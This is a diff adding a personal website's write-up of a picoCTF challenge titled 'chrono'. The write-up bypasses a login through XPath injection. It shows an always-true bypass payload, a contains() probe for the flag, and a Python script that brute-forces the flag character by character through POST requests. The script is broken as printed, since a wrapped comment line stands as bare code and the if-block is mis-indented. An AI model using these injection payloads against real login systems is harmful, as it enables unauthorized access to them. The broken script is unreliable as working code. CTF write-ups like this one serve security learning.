@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Chrono</title>
+    <link rel="stylesheet" href="../../../style.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.0/css/all.min.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github-dark.min.css">
+</head>
+
+
+<body>
+    <div class="container">
+        <header>
+            <div class="brand">/Steven Song</div>
+            <nav>
+                <a href="../../../index.html">/Home</a>
+                <a href="../../../about.html">/About</a>
+                <a href="../../../projects.html">/Projects</a>
+                <a href="../../../writeups.html">/Writeups</a>
+            </nav>
+        </header>
+
+        <main>
+            <h2>chrono</h2>
+            <hr>
+            <p>
+                <b><u>Description:</u></b> Another login you have to bypass. Maybe you can find an injection that works?
+                http://mercury.picoctf.net:59946/
+                <br><br>
+                <b><u>Writeup:</u></b> From the hint, we know this site is using XPATH, which is used to navigate or
+                point to nodes in an XML document. Similar to in an SQL injection, we can also use payloads in XPATH
+                syntax to gain unauthorized access or information. Using the always true payload below tells us we are
+                on the right track.
+            <pre>
+                    <code>
+--PAYLOAD:
+username: ' or 1=1 or '
+passowrd: (anything)
+                    </code>
+                </pre>
+            Looking at some additional XPATH functions, we can use the "contains" function to search for any specified string or
+            web elements.
+            <pre>
+                <code>
+--GENERAL CONTAINS FORMAT:
+//tagname[contains (@Attribute, ‘Value’)]
+                </code>
+            </pre>
+            Knowing this, we can query for the string of "picoCTF{" in the database.
+            <pre>
+                <code>
+--PAYLOAD:
+' or //*[contains(.,"picoCTF{")] or '
+                </code>
+            </pre>
+            Again, it tells us we are on the right path. It looks like we need to brute force the query to find our
+            flag. Using python we can write a simple loop that makes POST requests to the site with our payload until we
+            find the flag.
+            <pre>
+                <code>
+BRUTE FORCE SCRIPT:
+
+import requests
+import string
+                    
+# part of the flag we already know
+current_flag = "picoCTF{"
+# all available characters within a picoCTF flag (no uppercase!)
+available_chars = string.ascii_lowercase + string.digits + "}" + "_"
+                    
+# whie loop with "}" as our ending condition as we know thats what a flag ends with
+while "}" not in current_flag:
+    # for loop iterating through all of our avialable characters
+    for i in available_chars:
+        # making POST request at the site with name as our payload + 
+        current_flag and our iterative and pass as "pass"
+        r = requests.post("http://mercury.picoctf.net:59946/", 
+        {"name": "' or //*[contains(.,\"" + current_flag + i + "\")] or 'a", "pass": "pass"})
+            # if "right path" message in our output for our request...
+            if "right path" in r.text:
+                # append the iterative to our flag
+                current_flag = current_flag + i
+                # print the flag
+                print(current_flag)
+                # break from the loop
+                break
+                </code>
+            </pre>
+            <hr>
+        </main>
+        <footer>
+
+            <div class="social-icons">
+                <a href="https://github.com/stsong0812" target="_blank"><i class="fab fa-github"></i></a>
+                <a href="https://www.linkedin.com/in/stsong0812/" target="_blank"><i class="fab fa-linkedin"></i></a>
+                <a href="https://twitter.com/stsong0812" target="_blank"><i class="fab fa-twitter"></i></a>
+                <a href="https://www.youtube.com/channel/UCuS9ayL7pfooprPNrf2G6Qg" target="_blank"><i
+                        class="fab fa-youtube"></i></a>
+            </div>
+
+            <p>Copyright &copy; 2023 Steven Song</p>
+        </footer>
+    </div>
+    <script src="../../../scripts/enlarge_img.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+</body>
+
+</html>
